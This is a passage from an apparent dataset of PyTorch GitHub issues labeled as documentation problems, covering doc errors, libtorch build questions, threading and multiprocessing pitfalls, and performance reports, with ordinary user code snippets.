note::` to the doc about this behavior?\r\n\r\nAlso, cc @DmitryUlyanov , who is the first author of the paper, owner of the original lua code, and the contributor of the PyTorch module."},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n![image](https://user-images.githubusercontent.com/5652049/61066216-1bb84980-a3d3-11e9-9a9e-1f4ff38da81c.png)\r\n\r\nIt would be good for the example to do a contraction over three dimensions instead of two. Looking at the example alone, it isn't clear if you're supposed to pass in a collection of pairs or a pair of collections. There is one line in the docs that mentions this, but making the example clearer would be nice.\r\n\r\n"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nThe function is documented as taking no inputs, but uses inputs in the example. \r\n\r\n![image](https://user-images.githubusercontent.com/5652049/61009358-6d63c400-a340-11e9-8633-7d798588089b.png)\r\n"},{"labels":[null,"documentation",null,null],"text":"## 📚 Documentation\r\n\r\nhttps://pytorch.org/docs/master/torch.html#torch.lerp\r\n\r\n`The shapes of start and end must be broadcastable. If weight is a tensor, then the shapes of start, end must be broadcastable.`\r\n\r\nShould probably be `weight, start, end` must be broadcastable at the end.\r\n"},{"labels":[null,"documentation",null],"text":"When I try trace a model, I got this error:\r\n\r\n```\r\nTracedModules don't support parameter sharing between modules\r\n```\r\n\r\nAfter digging into jit module source codes, this error thrown for the reason that:\r\n```\r\nthe module weights already inside a set, but id is different with exists one, then out performs this error\r\n```\r\n\r\nhowever, this message is confusing. I think **it's nothing to do with parameters sharing, instead, it because of 2 modules or more with same weights but not same id**.\r\n\r\nI think the best way to indicates users to solve this, at least provide which layer or which modules conflicts with each other since they have same weights but not same id.\r\n\r\nIf you got same error when tracing a pytorch model. You should think about give my advise a :+1: "},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nCurrently it is not clear from the description how to interpret what `torch.lu` returns, i.e. how exactly to recover the matrices P, L and U from the return values. This indirectly means that it's also unclear what format `torch.lu_solve` expects. Note that the format of the return values differs from `scipy.linalg.lu`."},{"labels":[null,"documentation",null],"text":"## 📚 Documentation\r\n\r\n[Minor minor detail]\r\nIn the reproducibility section of the docs or in the FAQ, I would add a simple subsection/snippet of code to show how to programmatically check the running version of PyTorch. \r\nThis can also encourage users to take into account heterogeneity of PyTorch versions in their code.\r\n\r\nBy the way, a simple regex on `torch.__version__` is enough (this assuming version numbering will not change).\r\n```python\r\nimport torch\r\nimport re\r\nif int(re.search(r'([\\d.]+)', torch.__version__).group(1).replace('.', '')) < 100:\r\n    raise ImportError('Your PyTorch version is not supported. '\r\n                      'Please download and install PyTorch 1.x')\r\n```\r\n"},{"labels":[null,null,"documentation",null],"text":"hi, in my project I use libtorch.and there is an operation that libtorch does not support. and I want to \r\nimplement the operation myself. and I search the document,I have not found any help. I just want to implement the forward pass, and backward pass. does there is some document, that help me add an new op for libtorch."},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nSmall error in the comment documenting cosine simularity. I think:\r\n\r\n`  \\text{similarity} = \\dfrac{x_1 \\cdot x_2}{\\max(\\Vert x_1 \\Vert _2 \\cdot \\Vert x_2 \\Vert _2, \\epsilon)}.`\r\n\r\n, should be:\r\n\r\n`  \\text{similarity} = \\dfrac{x_1 \\cdot x_2}{\\max(\\Vert x_1 \\Vert _2 \\cdot \\Vert x_2 \\Vert _1, \\epsilon)}.`\r\n\r\nThat is, the last \\Vert_2 should actually be \\Vert_1\r\n\r\n"},{"labels":["documentation"],"text":"## 📚 Documentation\r\nComparisons used to output a `ByteTensor`, as pointed out by the doc (see below).\r\n\r\n<img width=\"871\" alt=\"Screenshot 2019-07-02 15 58 47\" src=\"https://user-images.githubusercontent.com/2119355/60518807-8d610b00-9ce2-11e9-9dc0-6e85a0b4b526.png\">\r\n\r\nIt looks it's not longer the case, as `dtype=uint8`.\r\nMoreover, can anyone point me to the PR for this change as well?.\r\n\r\nStill editing, hang on."},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nHere is a screenshot of [CTCLoss](https://pytorch.org/docs/stable/nn.html#torch.nn.CTCLoss) with some of the inconsistencies / bugs highlighted:\r\n\r\n![image](https://user-images.githubusercontent.com/44090/60384538-458e7980-9a7f-11e9-9d3e-3340ada665da.png)\r\n\r\nLooking at all other modules it is clear that this module is formatted totally incorrectly / inconsistently. This is from a different module, but shows how it should be:\r\n\r\n![image](https://user-images.githubusercontent.com/44090/60384577-afa71e80-9a7f-11e9-941d-c48d3aa6fc06.png)\r\n\r\n"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nAs per the description at `https://pytorch.org/get-started/previous-versions/` I use `conda install pytorch=0.4.1 cuda90 -c pytorch` but keep getting the following error:\r\n\r\n```\r\nFetching package metadata ...\r\n\r\nCondaHTTPError: HTTP 400 BAD REQUEST for url <https://conda.anaconda.org/pytorch/linux-64/repodata.json>\r\nElapsed: 00:00.193385\r\nCF-RAY: -\r\n\r\nAn HTTP error occurred when trying to retrieve this URL.\r\nHTTP errors are often intermittent, and a simple retry will get you on your way.\r\nHTTPError('400 Client Error: Bad Request for url: https://conda.anaconda.org/pytorch/linux-64/repodata.json',)\r\n```\r\nI attempted to `conda install` pytorch from other channels, but 0.4 version does not seem available anymore. "},{"labels":["documentation",null],"text":"Hello everyone, here is an update about quantized Tensor, we are actively working on brining in more support for quantization in PyTorch, please stay tuned.\r\nhttps://github.com/pytorch/pytorch/wiki/Introducing-Quantized-Tensor"},{"labels":[null,"documentation",null,null],"text":"## 📚 Documentation\r\n\r\nThis note is totally unclear to me. What does it mean? I don't know what should be called afterward. The link doesn't point to a function, just to torch.nn.Module. \r\n\r\n![image](https://user-images.githubusercontent.com/44090/60126626-b6d3e100-978e-11e9-9d76-d7df1f7415dc.png)\r\n\r\n"},{"labels":["documentation"],"text":"## 📚 Documentation\r\nI am working on [Torch.NET](https://github.com/SciSharp/Torch.NET) which is generated from the docs. Here is another bug I noticed:\r\n\r\n[torch.diagflat](https://pytorch.org/docs/stable/torch.html#torch.diagflat) parameter names are inconsistent: \r\n\r\n![image](https://user-images.githubusercontent.com/44090/59555541-6d2c0f00-8fb4-11e9-933c-210ae209d397.png)\r\n"},{"labels":["documentation"],"text":"## 📚 Documentation\r\nI am working on [Torch.NET](https://github.com/SciSharp/Torch.NET) which is generated from the docs. Here is another bug I noticed:\r\n\r\n[torch.bincount](https://pytorch.org/docs/stable/torch.html#torch.bincount) documentation is inconsistent:\r\n\r\n![image](https://user-images.githubusercontent.com/44090/59555436-72885a00-8fb2-11e9-8385-515c92fc0af2.png)\r\n"},{"labels":["documentation"],"text":"## 📚 Documentation\r\nI am working on [Torch.NET](https://github.com/SciSharp/Torch.NET) which is generated from the docs. Here is another bug I noticed:\r\n\r\nIn [torch.hamming_window](https://pytorch.org/docs/stable/torch.html#torch.hamming_window) the parameters alpah and beta are missing from parameters table. It is not a big deal, just inconsistent"},{"labels":["documentation"],"text":"## 📚 Documentation\r\n\r\nI am working on [Torch.NET](https://github.com/SciSharp/Torch.NET) which is generated from the docs. Here is another bug I noticed:\r\n\r\n[allclose](https://pytorch.org/docs/stable/torch.html#torch.allclose) documents parameter equal_nan as float, but it should be bool. \r\n"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\nI am working on [Torch.NET](https://github.com/SciSharp/Torch.NET) which is generated from the docs. Here is another bug I noticed: https://pytorch.org/docs/stable/torch.html#torch.unique\r\n\r\n![image](https://user-images.githubusercontent.com/44090/59552925-7fdf1d80-8f8d-11e9-8eb2-af0919e37b00.png)\r\n\r\nunique_consecutive is OK, so the correct doc string could be copied from there:\r\n\r\n![image](https://user-images.githubusercontent.com/44090/59552942-b7e66080-8f8d-11e9-95b6-52979a5994d1.png)\r\n\r\n"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nHello all,\r\n\r\nI am working on [Torch.NET](https://github.com/SciSharp/Torch.NET). While generating the API from the docs I noticed this inconsistency in [Tensor.sum_to_size](https://pytorch.org/docs/stable/tensors.html#torch.Tensor.sum_to_size): \r\n\r\nThe text mentions a parameter `other` which is not shown in the parameter list. "},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nIn `torch.utils.data` Samplers' [documentation](https://pytorch.org/docs/stable/data.html) I find the use of word \"element\" confusing.\r\nFor example, the description of `torch.utils.data.SequentialSampler` says:\r\n> Samples elements sequentially, always in the same order.\r\n\r\n`torch.utils.data.SequentialSampler` doesn't return elements of an object, but indices of those elements. This also applies to other samplers and is not clear from documentation.\r\n\r\nThe unfortunate example of `torch.utils.data.BatchSampler` only magnifies this confusion.\r\n`list(BatchSampler(SequentialSampler(range(10)), batch_size=3, drop_last=False))`\r\n`[[0, 1, 2], [3, 4, 5], [6, 7, 8], [9]]`\r\n`list(BatchSampler(SequentialSampler(range(10)), batch_size=3, drop_last=True))`\r\n`[[0, 1, 2], [3, 4, 5], [6, 7, 8]]`"},{"labels":["documentation",null,null,null,null],"text":"Steps to reproduce: run this test:\r\n\r\n```\r\n      def test_conv_backcompat(self):\r\n          from torch.serialization import SourceChangeWarning\r\n          # This file was generated by running on PyTorch 1.0.1 on Python 2:\r\n          #\r\n          #     import torch\r\n          #     from torch import nn\r\n          #     m = nn.Conv2d(1, 1, 1)\r\n          #     torch.save(m, 'legacy_conv2d.pt')\r\n          #\r\n          path = download_file('https://download.pytorch.org/test_data/legacy_conv2d.pt')\r\n          with warnings.catch_warnings():\r\n              warnings.simplefilter('ignore', SourceChangeWarning)\r\n              m = torch.load(path)\r\n          input = torch.randn((1, 1, 1, 1), dtype=torch.float)\r\n          self.assertEqual(m(input).size(), (1, 1, 1, 1))\r\n```\r\n\r\nThe problem is that the docstring in the module has a Unicode character and our unpickler doesn't specify any encoding (thus defaulting to ascii)."},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nFollowing the discussions in https://github.com/facebookresearch/PyTorch-BigGraph/issues/51#issuecomment-501293200, I'm opening this issue to let you know that the `cdist` function introduced in the last release of PyTorch [it has not been documented yet](https://pytorch.org/docs/stable/search.html?q=cdist&check_keywords=yes&area=default).\r\n"},{"labels":[null,"documentation",null],"text":""},{"labels":["documentation",null],"text":"In https://github.com/pytorch/pytorch/issues/21679#issue-455182954 I saw a user do this:\r\n\r\n```\r\n  auto m = torch::nn::BatchNorm(torch::nn::BatchNormOptions(2));\r\n  m->weight = torch::from_blob(&data[0][0],{2});\r\n  m->bias = torch::from_blob(&data[0][2],{2});\r\n  m->running_mean = torch::from_blob(&data[0][4],{2});\r\n  m->running_var = torch::from_blob(&data[0][6],{2});\r\n```\r\n\r\nThis is bad, you shouldn't do it. The reason is because you have created a new tensor and stuck it on the parameter slot, but the *registered* parameter (stored in the parameters vector) isn't updated in this case.\r\n\r\nI didn't see anything documented against this."},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nAs described [here](https://pytorch.org/docs/stable/torch.html#torch.arange) the output size of `torch.arange` is `int((end-start)/step)` (i.e. the floor). But it's the ceiling:\r\n\r\n```python\r\nimport torch\r\nimport numpy as np\r\ndef verify_out_shape(start, end, steps): \r\n    for s in steps: \r\n        dif = end-start \r\n        assert torch.arange(start, end, step=s).size(0) == np.ceil(dif/s)\r\n\r\nverify_out_shape(1, 400, [0.5, 0.7, 0.3, 1.3])  \r\nverify_out_shape(23, 731, [0.5, 0.7, 0.3, 1.3])  \r\n```"},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\n[torch.bernoulli](https://pytorch.org/docs/stable/torch.html#torch.bernoulli)  shows two extra parameters other than the two documented ones: * and generator=None\r\n\r\nWhat are they?\r\n\r\n"},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\nIt likely should be mentioned that the [`attn_mask`](https://github.com/pytorch/pytorch/blob/master/torch/nn/modules/activation.py#L767) argument of MHA is an additive mask (-inf masks values), rather than the standard multiplicative mask (0 masks values). Perhaps even enforce a value check (all values should be 0 / -inf ?, otherwise print warning?)"},{"labels":[null,"documentation",null,null],"text":"## ❓ Questions and Help\r\n\r\nI want to convert pytorch to onnx in pytorch nightly 1.1.0. The input type is ImageList. The outputput type is BoxList. \r\nThe convert code is\r\n`\r\ndummy_input = torch.autograd.Variable(torch.randn(1, 3, 640, 800).cuda())\r\ntorch.onnx.export(self.model, dummy_input, \"convert_models/onnx_model.onnx\")\r\n`\r\nBut I meet an error.\r\n\r\n> RuntimeError: Only tuples, lists and Variables supported as JIT inputs, but got BoxList.\r\n\r\nThanks.\r\n"},{"labels":[null,null,"documentation",null],"text":" I have a question about data manipulation with the C++ in libtorch.\r\nFor example, in pytorch I could deal with tensor like this:\r\nimg[:, :10, :] = 0\r\nbut with libtorch I don't know how to do as same as pytorch,if I use for circle,then it will be very slow,I want to know if there is any function with libtorch can do this,thank you very much.\r\n"},{"labels":[null,null,null,"documentation",null],"text":"Hi,\r\nhttps://github.com/pytorch/pytorch/blob/95eb9339c10ffc4d74312f35ac15fffa61596de1/torch/utils/collect_env.py#L114\r\nI find this function `get_running_cuda_version` ignores the existence of cudatoolkit in conda env, instead it uses `nvcc --version` , the system wide installed CUDA as a reference to get the cuda version. \r\nThis may be confusing if someone has cudatoolkit with a different cuda version installed.\r\nCan it be improved? Thanks."},{"labels":["documentation",null],"text":"E.g. go to https://pytorch.org/docs/stable/ and look at the HTML title of the page. It is `PyTorch documentation — PyTorch master documentation`\r\n"},{"labels":[null,"documentation",null,null],"text":"## 📚 Documentation\r\nhttps://pytorch.org/docs/stable/torch.html#torch.full_like\r\n\r\nThe behavior when the out tensor does not match type or device of input tensor is not obvious."},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\nFor tensor creation ops like `torch.zeros` and `torch.ones`, the docs [0], [1] use `sizes` as the first argument to the function call while the correct argument is `size`.  This is tested for pytorch 1.1 installed using pip on ubuntu 19.04\r\n\r\nAn example\r\n\r\n```\r\n>>> torch.zeros(2, 3)\r\ntensor([[0., 0., 0.],\r\n        [0., 0., 0.]])\r\n>>> torch.zeros(sizes = (2, 3))\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\nTypeError: zeros() missing 1 required positional arguments: \"size\"\r\n>>> torch.zeros(size = (2, 3))\r\ntensor([[0., 0., 0.],\r\n        [0., 0., 0.]])\r\n>>> torch.ones(sizes = (2, 3))\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\nTypeError: ones() missing 1 required positional arguments: \"size\"\r\n>>> torch.ones(size = (2, 3))\r\ntensor([[1., 1., 1.],\r\n        [1., 1., 1.]])\r\n```\r\n\r\n[0]: https://pytorch.org/docs/master/torch.html#torch.zeros\r\n[1]: https://pytorch.org/docs/master/torch.html#torch.ones"},{"labels":[null,"documentation",null,null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\n```python\r\ndef normal_(tensor, mean=0., std=1.):\r\n    # type: (Tensor, float, float) -> Tensor\r\n    r\"\"\"Fills the input Tensor with values drawn from the normal\r\n    distribution :math:`\\mathcal{N}(\\text{mean}, \\text{std})`.\r\n    ...\r\n    \"\"\"\r\n```\r\nthe latex should be\r\n$$\r\n\\mathcal{N}(\\text{mean},\\text{std}^2)\r\n$$"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nThe attention mask shape should be `(L, S)` since it is added to the attention weights which is of shape (N, L, S). This is only in master, and not on pytorch.org yet.\r\n\r\nhttps://github.com/pytorch/pytorch/pull/20850"},{"labels":[null,null,null,"documentation",null,null],"text":"## 🐛 Bug\r\n\r\nBelow is all the library generated which does not contain the libtorch.a. No error messages are observed.\r\n\r\nlibprotobuf-lite.a\r\nlibclog.a\r\nlibcpuinfo_internals.a\r\nlibcpuinfo.a\r\nlibpthreadpool.a\r\nlibqnnpack.a\r\nlibnnpack_reference_layers.a\r\nlibonnxifi_loader.a\r\nlibonnxifi_dummy.so\r\nlibfoxi_loader.a\r\nlibonnxifi.so\r\nlibfoxi_dummy.so\r\nlibfoxi.so\r\nlibgloo.a\r\nlibprotobuf.a\r\nlibgloo_builder.a\r\nlibprotoc.a\r\nlibonnx_proto.a\r\nlibc10.a\r\nlibonnx.a\r\nlibCaffe2_perfkernels_avx2.a\r\nlibCaffe2_perfkernels_avx.a\r\nlibcaffe2_protos.a\r\nlibnnpack.a\r\nlibmkldnn.a\r\nlibcaffe2.a\r\nlibTHD.a\r\nlibc10d.a\r\nlibtorch.so\r\nlibcaffe2_detectron_ops.so\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\nI follow offical steps to clone the lastest code\r\n```\r\nbranch master\r\nlast commit 7b9ee598d64bd35cad9afea8276ebd1c069620d9\r\nAuthor: Jongsoo Park <jongsoo@fb.com>\r\n```\r\n\r\nConfigure environment variables\r\n\r\n```\r\nexport NO_CUDA=1  //do not need GPU here\r\nexport BUILD_SHARED_LIBS=OFF //this is instructed here https://github.com/pytorch/pytorch/blob/master/docs/libtorch.rst\r\nexport BUILD_TEST=False //I set this, b/c test binary is not needed here\r\n```\r\n\r\n\r\nCommand to build the library\r\n```\r\nmkdir build && cd build\r\npython ../tools/build_libtorch.py\r\n```\r\n\r\nEnsure that dependencies are installed \r\n`conda install numpy ninja pyyaml mkl mkl-include setuptools cmake cffi typing`\r\n\r\n<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->\r\n\r\n## Expected behavior\r\nlibtorch.a is generated\r\n\r\n## Environment\r\n\r\nCollecting environment information...\r\nPyTorch version: 1.1.0a0+7b9ee59\r\nIs debug build: No\r\nCUDA used to build PyTorch: Could not collect\r\n\r\nOS:  Red Hat\r\nGCC version: (GCC) 4.8.5 20150623 (Red Hat 4.8.5-5)\r\nCMake version: version 3.12.0\r\n\r\nPython version: 3.6\r\nIs CUDA available: No\r\nCUDA runtime version: Could not collect\r\n\r\nNvidia driver version: 410.104\r\ncuDNN version: Could not collect\r\n\r\nVersions of relevant libraries:\r\n[pip3] numpy==1.15.0\r\n[pip3] numpydoc==0.7.0\r\n[pip3] torch==1.1.0\r\n[pip3] torchvision==0.2.2.post3\r\n[conda] mkl                       2019.3                      199  \r\n[conda] mkl-include               2019.3                      199  \r\n[conda] mkl-service               1.1.2                    py36_3  \r\n[conda] mkl_fft                   1.0.1            py36h3010b51_0  \r\n[conda] mkl_random                1.0.1            py36h629b387_0  \r\n[conda] scikit-learn              0.19.1          py36_nomklh6cfcb94_0  \r\n[conda] scipy                     1.1.0           py36_nomklh9c1e066_0  \r\n[conda] torch                     1.1.0a0+7b9ee59           <pip>\r\n[conda] torch                     1.1.0                     <pip>\r\n[conda] torchvision               0.2.2.post3               <pip>\r\n\r\n## Additional context\r\n\r\n<!-- Add any other context about the problem here. -->\r\n"},{"labels":[null,"documentation",null,null],"text":"## 📚 Documentation\r\n\r\nAs mentioned in [this post ](https://discuss.pytorch.org/t/a-possible-bug-in-torch-nn-functional-conv1d-2d/44066)\r\n\r\n[These docs for functional conv opperations](https://pytorch.org/docs/stable/nn.html?highlight=conv1d#torch.nn.functional.conv1d) show a optional argument `padding_mode`. However when specifying this argument an exception is raised:\r\n\r\n`TypeError: conv1d() got an unexpected keyword argument 'padding_mode'`\r\n\r\nUpon inspection of the modular Conv layers code, it can be seen that the `padding_mode` argument is used to apply padding before calling the functional conv:\r\nhttps://github.com/pytorch/pytorch/blob/v1.1.0/torch/nn/modules/conv.py#L192\r\n\r\nSo I believe the `padding_mode` argument should be removed from the **functional** conv docs, as this argument applies to the **modular** Conv layers only\r\n\r\nThanks "},{"labels":["documentation",null],"text":"## 🐛 Bug\r\n\r\nThere is an image on the main page of this repo:\r\n![image](https://user-images.githubusercontent.com/5480856/57926458-fc5dde00-78b3-11e9-819c-96119d99026e.png)\r\n\r\nLooks like the numbers on the result tensor are wrong (and pretty unreadable btw).\r\n"},{"labels":[null,null,"documentation",null,null,null],"text":"## 🐛 Bug\r\n\r\n<!-- A clear and concise description of what the bug is. -->\r\n\r\nAn outer torch.no_grad() is ignored inside a thread (e.g. `ThreadPoolExecutor.map`).\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n``` python\r\nimport torch\r\nfrom concurrent.futures import ThreadPoolExecutor\r\n\r\n# dummy data and network\r\ninput_data = torch.arange(10, dtype=torch.float32)\r\nnet = torch.nn.Sequential(\r\n    torch.nn.Linear(10, 1)\r\n)\r\n\r\nwith ThreadPoolExecutor(2) as ex:\r\n    with torch.no_grad():\r\n        # no_grad is working\r\n        assert net(input_data).grad_fn is None\r\n        \r\n        # Should fail because of the \"not\" <-------------------------------\r\n        assert list(ex.map(net, [input_data]))[0].grad_fn is not None\r\n        \r\n        # no_grad is working\r\n        assert list(ex.map(torch.no_grad()(net), [input_data]))[0].grad_fn is None\r\n        \r\n        # no_grad is working\r\n        assert net(input_data).grad_fn is None\r\n        \r\n    # Can calculate the gradient\r\n    assert net(input_data).grad_fn is not None\r\n```\r\n\r\n<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->\r\n\r\n## Expected behavior\r\n\r\n<!-- A clear and concise description of what you expected to happen. -->\r\n\r\nThe result of `list(ex.map(net, [input_data]))` should not have a `grad_fn`.\r\n\r\n## Environment\r\n\r\nPyTorch version: 1.1.0\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.0.130\r\n\r\nOS: Ubuntu 18.04.2 LTS\r\nGCC version: (Ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0\r\nCMake version: version 3.10.2\r\n\r\nPython version: 3.6\r\nIs CUDA available: Yes\r\nCUDA runtime version: 10.0.130\r\nGPU models and configuration: \r\nGPU 0: GeForce RTX 2070\r\nGPU 1: GeForce RTX 2070\r\n\r\nNvidia driver version: 415.25\r\ncuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.5.0\r\n\r\nVersions of relevant libraries:\r\n[pip] numpy==1.16.3\r\n[pip] numpy-ringbuffer==0.2.1\r\n[pip] numpydoc==0.8.0\r\n[pip] pytorch-sconce==1.3.4\r\n[pip] pytorchviz==0.0.1\r\n[pip] torch==1.1.0\r\n[pip] torch-nightly==1.0.0.dev20181114\r\n[pip] torchvision==0.2.1\r\n[conda] blas                      1.0                         mkl  \r\n[conda] mkl                       2019.3                      199  \r\n[conda] mkl-service               1.1.2            py36he904b0f_5  \r\n[conda] mkl_fft                   1.0.10           py36ha843d7b_0  \r\n[conda] mkl_random                1.0.2            py36hd81dba3_0  \r\n[conda] torch                     1.1.0                    pypi_0    pypi\r\n[conda] torchvision               0.2.2.post3              pypi_0    pypi\r\n\r\n\r\n## Additional context\r\n\r\n<!-- Add any other context about the problem here. -->\r\n"},{"labels":[null,"documentation",null,null],"text":"I propose something like this to find automatically members missing from rst (could be put on some doc page as well). This could also be improved to make a list of public members missing docs altogether.\r\n```python\r\nrst_dir = 'docs/source'\r\n\r\nrst = '\\n'.join(open(os.path.join(rst_dir, rst_file)).read() for rst_file in os.listdir(rst_dir))\r\n\r\nmembers = lambda obj : [(member, getattr(getattr(obj, member), '__doc__') is not None) for member in dir(obj) if not member.startswith('_') and member not in rst]\r\n\r\ndoctodo = members(torch) + members(torch.nn) + members(torch.nn.functional)\r\n```"},{"labels":[null,"documentation",null],"text":"Apparently, it's really popular for users to use multiprocessing + spawn in ipython/Jupyter notebooks. For example, #17680; also, https://fb.workplace.com/groups/1405155842844877/permalink/2766399306720517/ (FB-only)\r\n\r\nThere is a loaded footgun that occurs when you combine these three ingredients: the spawn method will **run everything in your notebook top-level** (and you probably have live statements on your notebook top-level; that's why you're running in a notebook) before actually running the requested function in question. This is unexpected for users, who just expected to be directly dropped into the function in question, and leads to all sorts of fun (`mp.set_start_method` reports that it's already been called; deadlock when the child process starts trying to run the same thing again).\r\n\r\nIt would be *really good* to document this somewhere people are actually going to read it, and maybe add some runtime checks to detect if this situation is happening and help users do the right thing.\r\n\r\ncc @colesbury @chandlerzuo "},{"labels":[null,"documentation",null],"text":"Quite a few times (e.g. https://github.com/pytorch/pytorch/issues/20301) some examples from docs became obsolete and ran unnoticed.\r\n\r\nProposal: ability to mark some examples in docs as tests and run them on CI and check execution for errors, warnings etc."},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\nDocs for `torch.nn.functional.gumbel_softmax`. \r\n\r\nFunction `gumbel_softmax` docstring entry for `Gumbel-Softmax distribution` has two Arxiv links:\r\n\r\n    .. _Gumbel-Softmax distribution:\r\n        https://arxiv.org/abs/1611.00712\r\n        https://arxiv.org/abs/1611.01144\r\n\r\nThe official [PyTorch docs](https://pytorch.org/docs/stable/nn.html#gumbel-softmax) concatenate the two links together to make [https://arxiv.org/abs/1611.00712https://arxiv.org/abs/1611.01144](https://arxiv.org/abs/1611.00712https://arxiv.org/abs/1611.01144) which is clearly an invalid link.\r\n\r\n*Note*: I am not sure how you would like this fixed.  It might be cleanest to separate it into two links. If you let me know, I can issue a pull request."},{"labels":[null,null,null,null,"documentation",null],"text":"On Slack, Geoffrey Yu asked:\r\n\r\n> Are there instructions for building libtorch from source? I feel like I'm missing something since I've tried building with `tools/build_libtorch.py`. However the build output doesn't seem to have the same structure as the prebuilt libtorch that you can download on pytorch.org\r\n\r\n@pjh5 responded: \"If you're curious, here's exactly what builds the libtorches https://github.com/pytorch/builder/blob/master/manywheel/build_common.sh#L120 . It's mostly tools/build_libtorch.py but also copies some header files from a wheel file\"\r\n\r\nThis is not mentioned at all in the \"how to build libtorch\" documentation: https://github.com/pytorch/pytorch/blob/master/docs/libtorch.rst Normally we give build instructions in README but there are no libtorch build instructions in the README. Additionally, the C++ API docs https://pytorch.org/cppdocs/ don't explain how to build from source.\r\n\r\nSome more users being confused about the matter:\r\n* https://discuss.pytorch.org/t/building-libtorch-c-distribution-from-source/27519/2\r\n* https://github.com/pytorch/pytorch/issues/20156\r\n\r\n"},{"labels":[null,"documentation",null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nI raise this issue because I encountered many warnings and errors compiling the documentation.\r\nI checked out version 1.1.0, and followed the instruction of \"Building the Documentation\" by running pip install -r requirements, and then make latexpdf. I already have texlive, latexmk, and other necessary latex packages installed. My system is Ubuntu 19.04.\r\n\r\nErrors include missing references, missing \"$\", extra alignment, etc. Given how verbose latex's error list is, I am not listing everything here. I can upload a log file of the errors if that is desired.\r\n\r\nIs there any specific version of latex that is required? \r\n\r\nThe reason I try to get a PDF is that PDF is so much better as a single file format when I don't get internet. PDF readers can handle very long PDF files smoothly, while my browser had a hard time to load a large single-file html is hard to handle by my browser. In this use case, PDF is overall a better solution.\r\n\r\nOn the other hand, I don't really know where the errors originated (the docs, Sphinx, or latex version). So, **maybe a better solution would be providing a downloadable PDF file of every release on the website**? I suppose that if the pytorch team already have a testing pipeline for documentation generation, it wouldn't be too much work to post the pdf file on the website. However, I don't really know if that fits into your pipeline.\r\n\r\nThank you very much!"},{"labels":[null,null,"documentation",null,null],"text":"I find that matrix multiplication is slower in C++ API, so I write the same code in C++ and python and record their execution times, code is as following:\r\n\r\n**C++:**\r\n```\r\n#include<torch/torch.h>\r\n#include<iostream>\r\n#include <chrono>\r\n\r\nint main(){\r\n\ttorch::Tensor tensor = torch::randn({2708, 1433});\r\n\ttorch::Tensor weight = torch::randn({1433, 16});\r\n\tauto start = std::chrono::high_resolution_clock::now();\r\n\ttensor.mm(weight);\r\n\tauto end = std::chrono::high_resolution_clock::now();\r\n\tstd::cout<< \"C++ Operation Time(s) \" << std::chrono::duration<double>(end - start).count() << \"s\" << \tstd::endl;\r\n\treturn 0;\r\n}\r\n```\r\n\r\n**Result**:\r\n```\r\nC++ Operation Time(s) 0.082496s\r\n```\r\n\r\n**python:**\r\n```\r\nimport torch\r\nimport torch.nn as nn\r\nimport torch.nn.functional as F\r\n\r\ntensor = torch.randn(2708, 1433)\r\nweight = torch.randn(1433, 16)\r\nt0 = time.time()\r\ntensor.mm(weight)\r\nt1 = time.time()\r\nprint(\"Python Operation Time(s) {:.4f}\".format(t1 - t0))\r\n```\r\n\r\n**Result**:\r\n```\r\nPython Operation Time(s) 0.0114\r\n```\r\n\r\n**Testing Environment:**\r\n```\r\nubuntu 16.04\r\ngcc version 5.4.0\r\npython version 3.7.3\r\npytorch version 1.0.1\r\n```\r\n\r\nIt's not a small difference, why is it happen???\r\n"},{"labels":[null,"documentation",null,null],"text":"```\r\nimport torch\r\nimport torchvision\r\nfrom torch.utils.tensorboard import SummaryWriter\r\nfrom torchvision import datasets, transforms\r\n```\r\n\r\n  # Writer will output to ./runs/ directory by default\r\n```\r\nwriter = 